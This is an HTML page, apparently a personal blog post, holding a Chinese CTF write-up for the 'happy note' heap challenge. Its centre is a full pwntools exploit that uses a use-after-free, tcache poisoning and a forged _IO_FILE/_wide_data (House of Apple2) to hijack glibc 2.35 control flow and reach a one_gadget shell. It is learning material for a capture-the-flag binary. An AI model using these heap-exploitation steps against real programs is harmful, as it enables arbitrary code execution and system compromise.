@@ -1,0 +1,141 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</title>
+</head>
+<body>
+<b>[巅峰极客 2022]happy note - 高版本glibc _IO_FILE初探</b><br>
+<small>2025-04-23</small>
+<hr>
+<p>第一次打高版本的_IO_FILE利用 也算正式进入了 house of家族了。</p>
+<p>这次用的是比较简单的house of apple2 </p>
+<p>因为_wide_data 的 _wide_vtable 没有像正常的_IO_FILE结构的 vtable检查</p>
+<p>所以可以通过伪造_IO_LIST_ALL 指向的 _IO_FILE 结构 </p>
+<p>在伪造指向的_WIDE_DATA 和 修改_IO_FIILE的vtable为_IO_wfile_jumps(可以符合vtable检查)</p>
+<p>同时把单链表指向的下一个_IO_FILE结构的_chain值破坏掉 引发刷新 然后就可以碰到one gadget</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+#from LibcSearcher import *
+context.log_level = &#x27;debug&#x27;
+context.arch = &#x27;amd64&#x27;
+#io = remote(&quot;node4.anna.nssctf.cn&quot;,28710)
+io = process(&quot;./happy_note&quot;)
+e = ELF(&#x27;./happy_note&#x27;)
+libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)
+
+def get_addr():
+	return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))
+
+def bug():
+    attach(io)
+
+s       = lambda data               :io.send(data)
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r       = lambda num                :io.recv(num)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+itr     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))
+uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))
+ls      = lambda data               :log.success(data)
+dlog     = lambda name,data         :log.success(f&quot;get &#123;name&#125;=&gt;&quot;+hex(data))
+
+def add(size,idx,mode):
+    sla(b&quot;&gt;&gt; &quot;,str(1))
+    sla(b&quot;size:&quot;,str(size))
+    sla(b&quot;note:&quot;,str(idx))
+    sla(b&quot;or [2]&quot;,str(mode))    
+    #mode 1 = calloc mode 2 = malloc only 2 twice
+    #input 666 can be uaf once 
+
+def delete(idx):
+    sla(b&quot;&gt;&gt; &quot;,str(2))
+    sla(b&quot;note:&quot;,str(idx))
+
+def show(idx):
+    sla(b&quot;&gt;&gt; &quot;,str(3))
+    sla(b&quot;to show?&quot;,str(idx))
+
+def edit(idx,content):
+    sla(b&quot;&gt;&gt; &quot;,str(4))
+    sla(b&quot;note:&quot;,str(idx))
+    sa(b&quot;content:&quot;,content)
+
+for i in range(11):
+     add(0x160,i,1)
+
+for i in range(7):
+     delete(i)
+sla(b&quot;&gt;&gt; &quot;,str(666))
+sla(b&quot;note:&quot;,str(7))
+delete(9)
+#现在7号区块bk为9号区块的heap_addr ,fd是main_arena , unsortbin没有safe-linking
+show(7)
+ru(b&quot;content: &quot;)
+leak_main_arena = uu64(r(6))
+dlog(&quot;leak_main_arena&quot;,leak_main_arena)
+edit(7,b&#x27;a&#x27;*8)
+show(7)
+ru(b&quot;a&quot;*8)
+leak_heap_addr = uu64(r(6))
+dlog(&quot;leak_heap_addr&quot;,leak_heap_addr)
+edit(7,p64(leak_main_arena)+p64(leak_heap_addr)) #fix
+libc_base = leak_main_arena - 96 - 0x150 - libc.sym[&quot;_IO_2_1_stdin_&quot;] - 144
+dlog(&quot;libc_base&quot;,libc_base)
+heap_base = leak_heap_addr - 0xf80
+dlog(&quot;heap_base&quot;,heap_base)
+libc_io_list_all = libc_base + libc.sym[&quot;_IO_list_all&quot;]
+dlog(&quot;libc_io_list_all&quot;,libc_io_list_all)
+enctypted_fd = (leak_heap_addr &gt;&gt; 12)^libc_io_list_all
+add(0x90,0,1)
+add(0x90,1,1)
+delete(1)
+delete(7) # idx 0 still uaf
+edit(0,p64(enctypted_fd))
+add(0x90,1,2)
+add(0x90,2,2) # use malloc and get _IO_list_all
+fake_file_io_struct = heap_base + 0x1260
+fake_wide_data = fake_file_io_struct + 0x210
+io_wfile_jumps = libc_base + libc.sym[&quot;_IO_wfile_jumps&quot;]
+dlog(&quot;fake_file_io_struct&quot;,fake_file_io_struct)
+dlog(&quot;fake_wide_data&quot;,fake_wide_data)
+dlog(&quot;io_wfile_jumps&quot;,io_wfile_jumps)
+og = [0x50a37,0xebcf1,0xebcf5,0xebcf8]
+ogg = libc_base + og[1]
+#edit(10,payload)
+add(0x200,3,1) #fake io_list_all
+add(0x200,4,1) #_fake_wide_data
+add(0x200,5,1) #_fake_wide_vtable
+fake_io_list_all_struct = FileStructure()
+fake_io_list_all_struct._IO_read_ptr = 0x521
+fake_io_list_all_struct._IO_read_end = 0x1000
+fake_io_list_all_struct._IO_write_ptr = 0x1000
+fake_io_list_all_struct._wide_data = fake_wide_data+0x10
+fake_io_list_all_struct.vtable = io_wfile_jumps
+fake_io_list_all_struct.chain = 0x1234 #通过把chain设置成乱七八糟的值破坏链表 从而刷新触发ogg
+edit(3,bytes(fake_io_list_all_struct))
+
+fake_vtable = heap_base + 0x1680 # idx0 
+edit(5,p64(ogg)*40) # fill ogg
+
+fake_wide_data = p64(0)+p64(0x510)+p64(0)*0x1a
+fake_wide_data += p64(fake_vtable+0x10)
+edit(4,bytes(fake_wide_data))
+edit(2,p64(fake_file_io_struct+0x10))
+
+#attach(io)
+delete(7)#使用 [返回到main函数]触发house of apple2
+
+#现在的接收都是u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12
+#而修改heap的fd指针则是(heap_addr &gt;&gt; 12)^target_addr
+
+io.interactive()</code></pre>
+
+<p>两次malloc 一次uaf 可以通过unsortbin切割块进tcache 然后通过uaf改 进tcache的fd 就可以拿到IO_LIST_ALL的写 然后覆盖成伪造的结构 然后触发返回到main函数 就可以触发one_gadget</p>
+<p>house家族真心有点难…</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
